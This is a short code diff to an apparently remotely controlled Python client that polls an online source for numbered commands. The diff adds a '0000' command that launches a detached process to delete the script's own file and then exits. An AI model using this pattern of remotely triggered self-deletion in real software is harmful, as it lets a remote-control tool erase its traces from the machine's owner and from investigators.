@@ -4,6 +4,7 @@ import requests
 import subprocess
 import time
 import allfunction
+import sys
 """
 Code        Type
 ----        -----
@@ -26,6 +27,10 @@ while True:
     #online loaded command code
 
     command_number_online = new_command[0:4] #the important code
+    if command_number_online == "0000":
+        import sys, subprocess 
+        subprocess.Popen("python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(sys.argv[0]))
+        sys.exit(0)
     code_status = allfunction.repeatchecker(command_number_online)
 
     if code_status is True:
